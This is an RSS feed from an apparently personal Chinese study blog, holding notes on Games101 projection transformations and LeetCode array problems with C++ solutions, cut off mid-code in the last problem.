<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>七天太乐</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>七天都要快乐 (★≧▽^))★☆</description>
    <pubDate>Mon, 15 Jul 2024 09:41:36 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Game101</title>
      <link>http://example.com/2024/07/15/Games101/</link>
      <guid>http://example.com/2024/07/15/Games101/</guid>
      <pubDate>Mon, 15 Jul 2024 08:23:09 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;Games101&quot;&gt;&lt;a href=&quot;#Games101&quot; class=&quot;headerlink&quot; title=&quot;Games101&quot;&gt;&lt;/a&gt;Games101&lt;/h1&gt;&lt;p&gt;Games101学习&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Games101"><a href="#Games101" class="headerlink" title="Games101"></a>Games101</h1><p>Games101学习</p><span id="more"></span><h2 id="Transformation"><a href="#Transformation" class="headerlink" title="Transformation"></a>Transformation</h2><ul><li><p>What is transformation？</p><ul><li>类比照相<ul><li>model trans(摆物体)</li><li>view trans(找角度)(改变的是相机)</li><li>projection trans(投影，变成照片)</li></ul></li></ul></li></ul><h3 id="View-Transformation-Model"><a href="#View-Transformation-Model" class="headerlink" title="View Transformation/Model"></a>View Transformation/Model</h3><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240715171904403.png" alt="image-20240715171904403"></p><ul><li><p>Define the camera</p><ul><li>position</li><li>gaze direction</li><li>up direction</li></ul></li><li><p>camera：The origin；up at Y；look at -Z</p></li><li><p>Transform camera by M~view~</p><ul><li>Trans e to origin</li><li>Rotate g to -Z</li><li>Rotate t to Y</li><li>Rotate (g x t) to X</li></ul></li><li><script type="math/tex; mode=display">M_{view} = R_{view}T_{view}</script></li><li><p>Trans e to origin</p><ul><li><script type="math/tex; mode=display">T_{view} = \left[\begin{matrix}1 & 0 & 0 & -x_e\\0 & 1 & 0 & -y_e\\0 & 0 & 1 & -z_e\\0 & 0 & 0 & 1\\\end{matrix}\right]</script></li></ul></li></ul><ul><li><p>Rotate R~view~</p><ul><li>Rotate g to -Z … is hard </li><li>inverse is easy  eg: X to(g x t) </li><li></li></ul></li></ul><script type="math/tex; mode=display">R_{view}^{-1} = \left[\begin{matrix} x_{gxt} & x_t & x_{-g} & 0\\y_{gxt} & y_t & y_{-g} & 0\\z_{gxt} & z_t & z_{-g} & 0\\0 & 0 & 0 & 1\\\end{matrix}\right]</script><ul><li><p>旋转矩阵是正交矩阵</p><ul><li><script type="math/tex; mode=display">R_{view} = \left[\begin{matrix} x_{gxt} & y_{gxt} & z_{gxt} & 0\\x_t & y_t & z_t  & 0\\x_{-g} & y_{-g} & z_{-g} & 0\\0 & 0 & 0 & 1\\\end{matrix}\right]</script></li></ul></li></ul><h3 id="Projection-Transformation"><a href="#Projection-Transformation" class="headerlink" title="Projection Transformation"></a>Projection Transformation</h3><ul><li>Perspective projection vs. orthographic projection<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240715140153873.png" alt="image-20240715140153873" style="zoom:50%;" /></li></ul></li></ul><h4 id="Orthographic-Projection"><a href="#Orthographic-Projection" class="headerlink" title="Orthographic Projection"></a>Orthographic Projection</h4><ul><li><p>simple understand</p><ul><li>camera pos (at origin; look at -Z; up at Y)</li><li>Drop Z coordinate</li><li>Translate and scale [-1,1]</li></ul></li><li><p>general</p><ul><li><p>a cuboid [l,r] x [b,t] x [f,n]</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240715140720302.png" alt="image-20240715140720302" style="zoom:33%;" /></li><li>沿-Z方向看，远小于近(n &gt; f)</li></ul></li><li><p>map to cannonical cube [-1,1]^3^</p><ul><li>translate</li><li>scale</li></ul></li><li><p>Transform matrix</p><ul><li><script type="math/tex; mode=display">R_{ortho} = \left[\begin{matrix} \frac{2}{r - l} & 0 & 0 & 0\\0 & \frac{2}{t - b} & 0 & 0\\0 & 0 & \frac{2}{n - f} & 0\\0 & 0 & 0 & 1\\\end{matrix}\right]\left[\begin{matrix} 1 & 0 & 0 & -\frac{r + l}{2}\\0 & 1 & 0 & -\frac{t + b}{2}\\0 & 0 & 1 & -\frac{n + f}{2}\\0 & 0 & 0 & 1\\\end{matrix}\right]</script></li></ul></li></ul></li></ul><h4 id="Perspective-Projection"><a href="#Perspective-Projection" class="headerlink" title="Perspective Projection"></a>Perspective Projection</h4><ul><li><p>近大远小</p></li><li><p>平行线不再相交</p></li><li><p>(x, y, z, 1) 与 (kx, ky, kz, k) 在空间中表示的是同一个点</p></li><li><p>How to do perspective projection</p><ul><li>First squish the frustum to cubiod (n -&gt; n; f -&gt; f)==M~persp-&gt;ortho~==</li><li>Do orthographic projection ==M~ortho~==(already konw)</li></ul></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240715144147046.png" alt="image-20240715144147046" style="zoom:33%;" /></p><center><p>侧视图</p></center><ul><li><script type="math/tex; mode=display">y’ = \frac{n}{z}y\\x' = \frac{n}{z}x</script></li><li><script type="math/tex; mode=display">\left[\begin{matrix} x\\y\\z\\1\\\end{matrix}\right] \Longrightarrow\left[\begin{matrix} \frac{nx}{z}\\\frac{nx}{y}\\unkonwn\\1\\\end{matrix}\right] \stackrel{\mathrm{minus\; z}}{==}\left[\begin{matrix} nx\\ny\\still\; unkown\\z\\\end{matrix}\right]</script></li><li><p>so </p><script type="math/tex; mode=display">M_{persp->ortho}^{(4\; x\; 4)}\left[\begin{matrix} x\\y\\z\\1\\\end{matrix}\right] =\left[\begin{matrix} nx\\ny\\still\; unkown\\z\\\end{matrix}\right]</script></li><li><p>figure out</p><script type="math/tex; mode=display">M_{persp->ortho} = \left[\begin{matrix}n & 0 & 0 & 0\\0 & n & 0 & 0\\? & ? & ? & ?\\0 & 0 & 1 & 0\\\end{matrix}\right]</script></li><li><script type="math/tex; mode=display">M_{persp->ortho}^{(4\; x\; 4)}\left[\begin{matrix} x\\y\\z\\1\\\end{matrix}\right] =\left[\begin{matrix} nx\\ny\\still\; unkown\\z\\\end{matrix}\right]</script><center><p>结果最后一个值需要是z</p></center></li><li><p>近平面的点不会发生任何变化</p><ul><li><p>replace z with n (<strong>keep z</strong>)</p></li><li><script type="math/tex; mode=display">\left[\begin{matrix} x\\y\\n\\1\\\end{matrix}\right] \Longrightarrow\left[\begin{matrix} x\\y\\n\\1\\\end{matrix}\right] \stackrel{}{==}\left[\begin{matrix} nx\\ny\\n^2\\n\\\end{matrix}\right]</script><center><p>→ 指代变换</p></center></li><li><p>n^2^与 x 和 y 无关，有：</p></li><li><script type="math/tex; mode=display">\left(\begin{matrix}0 & 0 & A & B\end{matrix}\right)\left(\begin{matrix}x\\y\\n\\1\\\end{matrix}\right) =\; n^2</script></li><li><script type="math/tex; mode=display">An + B = n^2</script></li></ul></li></ul></li></ul><ul><li><p>远平面的点Z不会发生任何变化</p><ul><li><p>远平面特殊点：中心点</p></li><li><p><strong>keep z</strong></p></li><li><script type="math/tex; mode=display">\left[\begin{matrix} 0\\0\\f\\1\\\end{matrix}\right] \Longrightarrow\left[\begin{matrix} 0\\0\\f\\1\\\end{matrix}\right] \stackrel{}{==}\left[\begin{matrix} 0\\0\\f^2\\f\\\end{matrix}\right]</script></li><li><script type="math/tex; mode=display">Af + B = f^2</script></li></ul></li><li><p>Solve A and B</p><ul><li><script type="math/tex; mode=display">An + B = n^2\qquad A = n + f\\Af + B = f^2\qquad\space B = -nf</script></li></ul></li></ul><ul><li><p>M~persp-&gt;ortho~ has solved !</p></li><li><script type="math/tex; mode=display">M_{persp->ortho} =\left[\begin{matrix}n & 0 & 0 & 0\\0 & n & 0 & 0\\0 & 0 & n+f & -nf\\0 & 0 & 1 & 0\\\end{matrix}\right]</script></li></ul><ul><li><p>Next : </p><ul><li><p>Do orthographic projection</p></li><li><script type="math/tex; mode=display">M_{persp} = M_{ortho}M_{persp->ortho}</script></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/CG/">CG</category>
      
      <category domain="http://example.com/categories/CG/TA/">TA</category>
      
      <category domain="http://example.com/categories/CG/TA/Games/">Games</category>
      
      
      <category domain="http://example.com/tags/Games/">Games</category>
      
      
      <comments>http://example.com/2024/07/15/Games101/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Leetcode刷题</title>
      <link>http://example.com/2024/03/05/leetcode%E5%88%B7%E9%A2%98/</link>
      <guid>http://example.com/2024/03/05/leetcode%E5%88%B7%E9%A2%98/</guid>
      <pubDate>Tue, 05 Mar 2024 01:55:50 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;leetcode刷题&quot;&gt;&lt;a href=&quot;#leetcode刷题&quot; class=&quot;headerlink&quot; title=&quot;leetcode刷题&quot;&gt;&lt;/a&gt;leetcode刷题&lt;/h1&gt;&lt;h2 id=&quot;数组&quot;&gt;&lt;a href=&quot;#数组&quot; class=&quot;headerli</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="leetcode刷题"><a href="#leetcode刷题" class="headerlink" title="leetcode刷题"></a>leetcode刷题</h1><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h4><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240305100410526.png" alt="image-20240305100410526" style="zoom:67%;" /></p><h5 id="我的算法思想："><a href="#我的算法思想：" class="headerlink" title="我的算法思想："></a>我的算法思想：</h5><p>通过遍历两次数组计算每两个元素的和，找到一对与target相等的元素返回即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">时间复杂度：O(n^2)</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans; </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>;j &lt; nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans = &#123;i,j&#125;;</span><br><span class="line">                    <span class="keyword">return</span> ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="学习："><a href="#学习：" class="headerlink" title="学习："></a>学习：</h5><h6 id="1-Vector作为C-中的动态数组容器，可以容纳多种数据类型，支持随机存储；定义及初始化操作："><a href="#1-Vector作为C-中的动态数组容器，可以容纳多种数据类型，支持随机存储；定义及初始化操作：" class="headerlink" title="1.Vector作为C++中的动态数组容器，可以容纳多种数据类型，支持随机存储；定义及初始化操作："></a>1.Vector作为C++中的动态数组容器，可以容纳多种数据类型，支持随机存储；定义及初始化操作：</h6><div class="table-container"><table><thead><tr><th style="text-align:center">vector<T> v1</th><th style="text-align:center">v1是一个元素类型为T的空容器</th></tr></thead><tbody><tr><td style="text-align:center">vector<T> v2(v1)</td><td style="text-align:center">使用v1中的元素初始化v2</td></tr><tr><td style="text-align:center">vector<T> v2 = v1</td><td style="text-align:center">同上</td></tr><tr><td style="text-align:center">vector<T> v3(n,val)</td><td style="text-align:center">v3中包含n个值为val的元素</td></tr><tr><td style="text-align:center">vector<T> v4 {a,b,c…}</td><td style="text-align:center">使用a,b,c…初始化v4</td></tr><tr><td style="text-align:center">vector<vector<int>&gt; matrix(M,vector<int>(N))</td><td style="text-align:center">二维数组初始化</td></tr><tr><td style="text-align:center">vector<T> v5(n)</td><td style="text-align:center">v5中包含n个默认值的初始化元素</td></tr></tbody></table></div><p>常用操作：</p><div class="table-container"><table><thead><tr><th style="text-align:center">v1 = {a,b,c…}</th><th style="text-align:center">用元素{a,b,c….}替代v1中元素</th></tr></thead><tbody><tr><td style="text-align:center"></td></tr></tbody></table></div><h6 id="2-寻找更优的算法："><a href="#2-寻找更优的算法：" class="headerlink" title="2.寻找更优的算法："></a>2.寻找更优的算法：</h6><p>利用哈希表可以将寻找 target - x 的时间从O(N)降到O(1);</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = hashtable.<span class="built_in">find</span>(target - nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it != hashtable.<span class="built_in">end</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;it-&gt;second,i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意：C++中哈希表find()函数是以key键值作为参数寻找哈希表中元素，对于本题应该将x的值作为key，对应index索引值作为指向值。</p><h4 id="26-删除有序数组中的重复项"><a href="#26-删除有序数组中的重复项" class="headerlink" title="26.删除有序数组中的重复项"></a>26.删除有序数组中的重复项</h4><h5 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h5><p>利用两个指针遍历有序数组，如果快指针与慢指针值相同，快指针后移；不同，则将快指针指向的值赋给慢指针，然后慢指针后移，直到快指针走到最后。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != nums[index])</span><br><span class="line">            &#123;</span><br><span class="line">                nums[++index] = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>1.题目中提示有判断结果的方式，根据算法的返回值来比对对应长度的数组是否相同，不需要将数组重复元素删除，将重复元素后移返回对应长度即可。</p><p>2.思考二：可以调用Unique方法，但本质还是上述思想，将非重复元素前移。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">auto</span> pos = <span class="built_in">unique</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">distance</span>(nums.<span class="built_in">begin</span>(),pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="27移除元素"><a href="#27移除元素" class="headerlink" title="27移除元素"></a>27移除元素</h4><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240309095109888.png" alt="image-20240309095109888" style="zoom:67%;" /></p><h5 id="我的算法思想：双指针法-头尾指针-："><a href="#我的算法思想：双指针法-头尾指针-：" class="headerlink" title="我的算法思想：双指针法(头尾指针)："></a>我的算法思想：双指针法(头尾指针)：</h5><p>从头尾同时遍历数组，根据题目要求，数组前半部分元素 != val值，后半部分 == val值，故当头指针指向元素的值 == val，与尾指针对应元素交换，尾指针前移；当不等时，头指针后移。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span> &amp;&amp; nums[<span class="number">0</span>] == val)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>,j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == val)</span><br><span class="line">            &#123;</span><br><span class="line">                nums[i] = nums[j--];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>改进：头指针的值等于结果数组的长度；将尾指针初始位置后移一位，不用再单独判断n = 1的情况，同时while截至条件不需要等于。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>,j = n;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == val)</span><br><span class="line">            &#123;</span><br><span class="line">                nums[i] = nums[j<span class="number">-1</span>];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="思想二：双指针法-头头指针"><a href="#思想二：双指针法-头头指针" class="headerlink" title="思想二：双指针法(头头指针)"></a>思想二：双指针法(头头指针)</h5><p>设置两个头指针，只要保证结果数组中左半部分的正确性即可，故令两个指针速度不同，慢指针指向左半数组应当填充元素位置，快指针用于遍历整个数组，当快指针指向元素 != val，将其加入慢指针指向位置，同时快慢指针后移；否则快指针后移。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> fast = <span class="number">0</span>;fast &lt; n;fast++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != val)</span><br><span class="line">            &#123;</span><br><span class="line">                nums[slow++] = nums[fast];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="35搜索插入位置"><a href="#35搜索插入位置" class="headerlink" title="35搜索插入位置"></a>35搜索插入位置</h4><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240319112848606.png" alt="image-20240319112848606"></p><h5 id="我的算法思想：二分查找"><a href="#我的算法思想：二分查找" class="headerlink" title="我的算法思想：二分查找"></a>我的算法思想：二分查找</h5><p>由于题目要求时间复杂度必须为O(log n)，所以首先想到二分查找的方法，如果找到目标值就返回mid索引，未找到目标值代表最终结果时low &gt; high；只有两种情况：</p><p>1.nums[mid] &gt; target：high前移，low指向应该插入位置</p><p>2.nums[mid] &lt; target：low后移，low指向应该插入位置</p><p>其中low永远指向第一个小于target的后一元素</p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240319114339183.png" alt="image-20240319114339183" style="zoom: 80%;" /></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">searchInsert</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> high = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> mid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">            mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">            &#123;</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h6 id="采用移位计算mid防止溢出"><a href="#采用移位计算mid防止溢出" class="headerlink" title="采用移位计算mid防止溢出"></a>采用移位计算mid防止溢出</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mid = ((right - left) &gt;&gt; <span class="number">1</span>) + left;</span><br></pre></td></tr></table></figure><h5 id="思想二：递归"><a href="#思想二：递归" class="headerlink" title="思想二：递归"></a>思想二：递归</h5><h4 id="66-加一"><a href="#66-加一" class="headerlink" title="66.加一"></a>66.加一</h4><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240320112513928.png" alt="image-20240320112513928" style="zoom:80%;" /></p><h5 id="我的思想："><a href="#我的思想：" class="headerlink" title="我的思想："></a>我的思想：</h5><p>从最后一位开始判断是否是9，如果是9，需要化0然后进位；否则加1返回数组即可；同时需要注意如果直到第一位也需要进位需要扩大数组长度；</p><p>采用递归</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">Binary</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits,<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(digits[index] == <span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            digits[index] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(index == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                